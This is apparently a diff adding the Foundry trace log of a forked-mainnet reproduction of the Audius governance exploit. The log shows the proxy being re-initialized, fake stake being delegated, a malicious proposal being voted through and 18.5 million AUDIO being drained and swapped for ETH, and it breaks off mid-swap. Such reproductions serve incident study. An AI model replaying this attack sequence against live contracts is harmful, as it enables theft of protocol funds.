@@ -1,0 +1,340 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Audius_exp.sol:AttackContract
+[PASS] testExploit() (gas: 1005996)
+Logs:
+  ---------- Start from Block 15201793 ----------
+  Attacker ETH Balance: 0.917637498433527644
+  -------------------- Tx1 --------------------
+  Modify configurations...
+  -> votingPeriod : 3 blocks
+  -> executionDelay : 0 block
+  -> guardianAddress : self
+  Evaluate Proposal...
+  Submit Proposal...
+  -------------------- Tx2 --------------------
+  SubmitVote `Yes` for malicious ProposalId 85...
+  -------------------- Tx3 --------------------
+  Execute malicious ProposalId 85...
+  AttackContract AUDIO Balance: 18564497.819999999999735541
+  -------------------- Tx4 --------------------
+  AUDIO/ETH Swap...
+  -------------------- End --------------------
+  Attacker ETH Balance: 705.095181359677355662
+
+Traces:
+  [7433] AttackContract::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 15201793 [1.52e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(AUDIO: [0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998], "AUDIO")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], "UniswapV2Router02")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(GovernanceProxy: [0x4DEcA517D6817B6510798b7328F2314d3003AbAC], "GovernanceProxy")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Stacking: [0xe6D97B2099F142513be7A2a068bE040656Ae4591], "Stacking")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(DelegateManagerV2: [0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225], "DelegateManagerV2")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [1060996] AttackContract::testExploit()
+    ├─ [0] console::log("---------- Start from Block %s ----------", 15201793 [1.52e7]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance", val: 917637498433527644 [9.176e17], decimals: 18)
+    ├─ [0] console::log("-------------------- Tx1 --------------------") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Modify configurations...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("-> votingPeriod : 3 blocks") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("-> executionDelay : 0 block") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("-> guardianAddress : self") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [25713] GovernanceProxy::initialize(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3, 0, 1, 4, AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [20691] 0x35dD16dFA4ea1522c29DdD087E8F076Cad0AE5E8::initialize(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3, 0, 1, 4, AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─  storage changes:
+    │   │   │   @ 51: 0x0000000000000000000000a62c3ced6906b188a4d4a3c981b79f2aabf2107f01 → 0x00000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149601
+    │   │   │   @ 58: 0x00000000000000000000a62c3ced6906b188a4d4a3c981b79f2aabf2107f0004 → 0x000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960004
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] console::log("Evaluate Proposal...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [98294] GovernanceProxy::evaluateProposalOutcome(84)
+    │   ├─ [97796] 0x35dD16dFA4ea1522c29DdD087E8F076Cad0AE5E8::evaluateProposalOutcome(84) [delegatecall]
+    │   │   ├─ [685] AttackContract::getContract(0x3078000000000000000000000000000000000000000000000000000000000000) [staticcall]
+    │   │   │   └─ ← [Return] AUDIO: [0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998]
+    │   │   ├─ [12567] Stacking::fallback(15201736 [1.52e7]) [staticcall]
+    │   │   │   ├─ [7569] Staking::totalStakedAt(15201736 [1.52e7]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 10000357056668494479746388146790 [1e31]
+    │   │   │   └─ ← [Return] 10000357056668494479746388146790 [1e31]
+    │   │   ├─  emit topic 0: 0xb5c05f2b4df457fb2a62ca282c87338fa901f0b7de530321f507d59859cc11cf
+    │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000054
+    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000003
+    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xece66cfdbd22e3f37d348a3d8e19074452862cd65fd4b9a11f0336d1ac6d1dc3: 84 → 0
+    │   │   │   @ 61: 1 → 0
+    │   │   │   @ 0x4ae0989b770e0408e40e25c4cc7528befd3c98d597853de167a787639b853e33: 0 → 3
+    │   │   └─ ← [Return] 3
+    │   └─ ← [Return] 3
+    ├─ [7508] AUDIO::balanceOf(GovernanceProxy: [0x4DEcA517D6817B6510798b7328F2314d3003AbAC]) [staticcall]
+    │   ├─ [2510] 0x22A9CCfdd10382D9cD18cA4437ff375bd7A87BBd::balanceOf(GovernanceProxy: [0x4DEcA517D6817B6510798b7328F2314d3003AbAC]) [delegatecall]
+    │   │   └─ ← [Return] 18752017999999999999732870 [1.875e25]
+    │   └─ ← [Return] 18752017999999999999732870 [1.875e25]
+    ├─ [0] console::log("Submit Proposal...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [297609] GovernanceProxy::submitProposal(0x0000000000000000000000000000000000000000000000000000000000000c06, 0, "transfer(address,uint256)", 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000f5b2f71812d138f71f6f5, "Hello", "World")
+    │   ├─ [297030] 0x35dD16dFA4ea1522c29DdD087E8F076Cad0AE5E8::submitProposal(0x0000000000000000000000000000000000000000000000000000000000000c06, 0, "transfer(address,uint256)", 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000f5b2f71812d138f71f6f5, "Hello", "World") [delegatecall]
+    │   │   ├─ [1129] GovernanceProxy::inProgressProposalsAreUpToDate() [staticcall]
+    │   │   │   ├─ [634] 0x35dD16dFA4ea1522c29DdD087E8F076Cad0AE5E8::inProgressProposalsAreUpToDate() [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ [20524] 0xD17A9bc90c582249e211a4f4b16721e7f65156c8::getServiceProviderDetails(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [15502] ServiceProviderFactory::getServiceProviderDetails(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0, 0, false, 0, 0, 0
+    │   │   │   └─ ← [Return] 0, 0, false, 0, 0, 0
+    │   │   ├─ [5451] 0xD17A9bc90c582249e211a4f4b16721e7f65156c8::getPendingDecreaseStakeRequest(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [4950] ServiceProviderFactory::getPendingDecreaseStakeRequest(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0, 0
+    │   │   │   └─ ← [Return] 0, 0
+    │   │   ├─ [9758] DelegateManagerV2::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [4760] DelegateManagerV2::getTotalDelegatorStake(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [7769] DelegateManagerV2::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [7265] DelegateManagerV2::getPendingUndelegateRequest(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, 0
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, 0
+    │   │   ├─ [685] AttackContract::getContract(0x0000000000000000000000000000000000000000000000000000000000000c06) [staticcall]
+    │   │   │   └─ ← [Return] AUDIO: [0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998]
+    │   │   ├─  emit topic 0: 0x7edc618964f595eb3f96e87d2c01643484aa8490797eb47bd46680d0ad4c7f72
+    │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000055
+    │   │   │        topic 2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000548656c6c6f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005576f726c64000000000000000000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 59: 84 → 85
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19ac: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19ae: 0 → 3078
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19af: 0 → 0x00000000000000000000000018aaa7115705e8be94bffebde57af9bfc265b998
+    │   │   │   @ 0xece66cfdbd22e3f37d348a3d8e19074452862cd65fd4b9a11f0336d1ac6d1dc3: 0 → 85
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19b1: 0 → 0x7472616e7366657228616464726573732c75696e743235362900000000000032
+    │   │   │   @ 0xa287495c3c571314315dfbc8bacc3884c3f5e2ab1a6a620f0af24c3570693cac: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19b2: 0 → 129
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19b9: 0 → 0xbf7376680c902fcf38ed91530e17d92afd22321b53acf6bc78a8f128eeefe95d
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19ab: 0 → 85
+    │   │   │   @ 0xa287495c3c571314315dfbc8bacc3884c3f5e2ab1a6a620f0af24c3570693cad: 0 → 0x0000000000000000000000000000000000000000000f5b2f71812d138f71f6f5
+    │   │   │   @ 61: 0 → 1
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19ad: 0 → 0x0000000000000000000000000000000000000000000000000000000000e7f601
+    │   │   └─ ← [Return] 85
+    │   └─ ← [Return] 85
+    ├─ [12967] Stacking::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [12469] Staking::initialize(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ [406] AttackContract::isGovernanceAddress() [staticcall]
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 51: 0x0000000000000000000000a62c3ced6906b188a4d4a3c981b79f2aabf2107f01 → 0x00000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149601
+    │   │   │   @ 55: 0x000000000000000000000000a62c3ced6906b188a4d4a3c981b79f2aabf2107f → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [27320] DelegateManagerV2::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
+    │   ├─ [26816] DelegateManagerV2::initialize(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1) [delegatecall]
+    │   │   ├─ [406] AttackContract::isGovernanceAddress() [staticcall]
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [355] AttackContract::getExecutionDelay() [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [398] AttackContract::getVotingPeriod() [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [355] AttackContract::getExecutionDelay() [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [398] AttackContract::getVotingPeriod() [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─  storage changes:
+    │   │   │   @ 51: 0x0000000000000000000000a62c3ced6906b188a4d4a3c981b79f2aabf2107f01 → 0x00000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149601
+    │   │   │   @ 60: 0x000000000000000000000000a62c3ced6906b188a4d4a3c981b79f2aabf2107f → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [7551] DelegateManagerV2::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [7056] DelegateManagerV2::setServiceProviderFactoryAddress(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ emit ServiceProviderFactoryAddressUpdated(_newServiceProviderFactoryAddress: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─  storage changes:
+    │   │   │   @ 53: 0x000000000000000000000000a62c3ced6906b188a4d4a3c981b79f2aabf2107f → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [227513] DelegateManagerV2::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000000000000000 [1e31])
+    │   ├─ [227012] DelegateManagerV2::delegateStake(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000000000000000 [1e31]) [delegatecall]
+    │   │   ├─ [20470] 0x44617F9dCEd9787C3B06a05B35B4C779a2AA1334::claimPending(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [15472] 0xc41BD365479Df890676Ea3057a063456C1066Bef::claimPending(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   ├─ [3258] Stacking::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   ├─ [2760] Staking::lastClaimedFor(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2024] 0xD17A9bc90c582249e211a4f4b16721e7f65156c8::getServiceProviderDetails(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   ├─ [1502] ServiceProviderFactory::getServiceProviderDetails(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0, 0, false, 0, 0, 0
+    │   │   │   │   │   └─ ← [Return] 0, 0, false, 0, 0, 0
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [81344] Stacking::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000000000000000 [1e31])
+    │   │   │   ├─ [80840] Staking::delegateStakeFor(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000000000000000 [1e31]) [delegatecall]
+    │   │   │   │   ├─ [1144] AttackContract::transferFrom(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Stacking: [0xe6D97B2099F142513be7A2a068bE040656Ae4591], 10000000000000000000000000000000 [1e31])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Staked(user: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 10000000000000000000000000000000 [1e31], total: 10000000000000000000000000000000 [1e31])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf7811c4e37107f9fd74737d3822f7d3663adb1fc65949cc93789adbfe91261d1: 0 → 0x00000000000000000000007e37be2022c0914b26800000000000000000e7f601
+    │   │   │   │   │   @ 57: 4433 → 4434
+    │   │   │   │   │   @ 0x3268882d7289c984c08fa9b2f910b4cd54971c01a6ed84de52e4676495628b9f: 0 → 1
+    │   │   │   │   │   @ 0xdc16fef70f8d5ddbc01ee3d903d1e69c18a3c7be080eb86a81e0578814ee6a24: 0 → 0x0000000000000000000000fc70a399f649dddc75a1073a660000000000e7f601
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [537] AttackContract::validateAccountStakeBalance(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit IncreaseDelegatedStake(_delegator: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _serviceProvider: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _increaseAmount: 10000000000000000000000000000000 [1e31])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xcbc2e077ae776347cfe06d33a96935d43d65b0bc807448605c77df6add489b93: 0 → 1
+    │   │   │   @ 0xca710000f2dc7e5f8433fbdcd796aff268d4b3502706c644bfd6277ba0541ff0: 0 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   │   @ 0x3773d84fc25b14406e7bbe186f6423a1dde987a8ea9ca45048167fb0900cbc32: 0 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   │   @ 0xb5fa19d983346312cd3f41ded728539cde278edef87c05c97d22de005add1922: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0xcbc2e077ae776347cfe06d33a96935d43d65b0bc807448605c77df6add489b91: 0 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   └─ ← [Return] 10000000000000000000000000000000 [1e31]
+    │   └─ ← [Return] 10000000000000000000000000000000 [1e31]
+    ├─ [0] console::log("-------------------- Tx2 --------------------") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("SubmitVote `Yes` for malicious ProposalId 85...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::roll(15201795 [1.52e7])
+    │   └─ ← [Return]
+    ├─ [99262] GovernanceProxy::submitVote(85, 2)
+    │   ├─ [98764] 0x35dD16dFA4ea1522c29DdD087E8F076Cad0AE5E8::submitVote(85, 2) [delegatecall]
+    │   │   ├─ [2024] 0xD17A9bc90c582249e211a4f4b16721e7f65156c8::getServiceProviderDetails(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [1502] ServiceProviderFactory::getServiceProviderDetails(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0, 0, false, 0, 0, 0
+    │   │   │   └─ ← [Return] 0, 0, false, 0, 0, 0
+    │   │   ├─ [1451] 0xD17A9bc90c582249e211a4f4b16721e7f65156c8::getPendingDecreaseStakeRequest(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [950] ServiceProviderFactory::getPendingDecreaseStakeRequest(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0, 0
+    │   │   │   └─ ← [Return] 0, 0
+    │   │   ├─ [1258] DelegateManagerV2::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [760] DelegateManagerV2::getTotalDelegatorStake(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 10000000000000000000000000000000 [1e31]
+    │   │   │   └─ ← [Return] 10000000000000000000000000000000 [1e31]
+    │   │   ├─ [1769] DelegateManagerV2::fallback(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [1265] DelegateManagerV2::getPendingUndelegateRequest(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, 0
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, 0
+    │   │   ├─  emit topic 0: 0xf3f11b6b0f2367aeeec3a6b96f9528d1b57165334563e1d7083be608cdb64a54
+    │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000055
+    │   │   │        topic 2: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000002
+    │   │   │           data: 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19b6: 0 → 1
+    │   │   │   @ 0x022dcde210ed4e80dcbe12c3172f7b723ded37845c302a34b9c23b32221411ed: 0 → 2
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19b4: 0 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   │   @ 0xff398be0924908a681788adc6fb382b80e089f05e0bea36196c08af31f0b4107: 0 → 0x000000000000000000000000000000000000007e37be2022c0914b2680000000
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [0] console::log("-------------------- Tx3 --------------------") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Execute malicious ProposalId 85...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::roll(15201798 [1.52e7])
+    │   └─ ← [Return]
+    ├─ [74391] GovernanceProxy::evaluateProposalOutcome(85)
+    │   ├─ [73893] 0x35dD16dFA4ea1522c29DdD087E8F076Cad0AE5E8::evaluateProposalOutcome(85) [delegatecall]
+    │   │   ├─ [685] AttackContract::getContract(0x0000000000000000000000000000000000000000000000000000000000000c06) [staticcall]
+    │   │   │   └─ ← [Return] AUDIO: [0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998]
+    │   │   ├─ [2067] Stacking::fallback(15201793 [1.52e7]) [staticcall]
+    │   │   │   ├─ [1569] Staking::totalStakedAt(15201793 [1.52e7]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 20000357056668494479746388146790 [2e31]
+    │   │   │   └─ ← [Return] 20000357056668494479746388146790 [2e31]
+    │   │   ├─ [30735] AUDIO::transfer(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18564497819999999999735541 [1.856e25])
+    │   │   │   ├─ [30234] 0x22A9CCfdd10382D9cD18cA4437ff375bd7A87BBd::transfer(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 18564497819999999999735541 [1.856e25]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: GovernanceProxy: [0x4DEcA517D6817B6510798b7328F2314d3003AbAC], to: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 18564497819999999999735541 [1.856e25])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe6e4cb32c6a2151ad8544d40aebef169f8f47dfb2562aa59a51a7e4a7234ae75: 0x0000000000000000000000000000000000000000000f82e4eec5b6950d03ec86 → 0x0000000000000000000000000000000000000000000027b57d4489817d91f591
+    │   │   │   │   │   @ 0xa177ad5b1609a4e783625b46e3ee407279131ff23903962d9c5ce8a1440867a5: 0 → 0x0000000000000000000000000000000000000000000f5b2f71812d138f71f6f5
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  emit topic 0: 0xa85727613e00cfd4688ad13995391ed4b4cd9e493bcb978393d8fddeec804dbd
+    │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000055
+    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  emit topic 0: 0xb5c05f2b4df457fb2a62ca282c87338fa901f0b7de530321f507d59859cc11cf
+    │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000055
+    │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000002
+    │   │   │           data: 0x000000000000000000000000000000000000007e37be2022c0914b268000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xece66cfdbd22e3f37d348a3d8e19074452862cd65fd4b9a11f0336d1ac6d1dc3: 85 → 0
+    │   │   │   @ 0x49157b242564839087dcaef57fcbfdae9309e1ea00bce40edd87ee97d7eb19b3: 0 → 2
+    │   │   │   @ 61: 1 → 0
+    │   │   └─ ← [Return] 2
+    │   └─ ← [Return] 2
+    ├─ [1008] AUDIO::balanceOf(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [510] 0x22A9CCfdd10382D9cD18cA4437ff375bd7A87BBd::balanceOf(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 18564497819999999999735541 [1.856e25]
+    │   └─ ← [Return] 18564497819999999999735541 [1.856e25]
+    ├─ emit log_named_decimal_uint(key: "AttackContract AUDIO Balance", val: 18564497819999999999735541 [1.856e25], decimals: 18)
+    ├─ [0] console::log("-------------------- Tx4 --------------------") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("AUDIO/ETH Swap...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [25260] AUDIO::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 10000000000000000000000000000000000000000 [1e40])
+    │   ├─ [24759] 0x22A9CCfdd10382D9cD18cA4437ff375bd7A87BBd::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 10000000000000000000000000000000000000000 [1e40]) [delegatecall]
+    │   │   ├─ emit Approval(owner: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 10000000000000000000000000000000000000000 [1e40])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x16eb9c120c2a5fa294c01611a42bfb5ab7fdaf8fb7c9f00667f16c1b7e5ae708: 0 → 0x0000000000000000000000000000001d6329f1c35ca4bfabb9f5610000000000
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [106577] UniswapV2Router02::swapExactTokensForETH(18564497819999999999735541 [1.856e25], 680000000000000000000 [6.8e20], [0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0xa0c7BD318D69424603CBf91e9969870F21B8ab4c, 1658617788 [1.658e9])
+    │   ├─ [2504] 0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79::getReserves() [staticcall]
+    │   │   └─ ← [Return] 3571745150672401133695720 [3.571e24], 840066533939998180500 [8.4e20], 1658615935 [1.658e9]
+    │   ├─ [11498] AUDIO::transferFrom(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79, 18564497819999999999735541 [1.856e25])
+    │   │   ├─ [10991] 0x22A9CCfdd10382D9cD18cA4437ff375bd7A87BBd::transferFrom(AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79, 18564497819999999999735541 [1.856e25]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: AttackContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xC730EF0f4973DA9cC0aB8Ab291890D3e77f58F79, value: 18564497819999999999735541 [1.856e25])
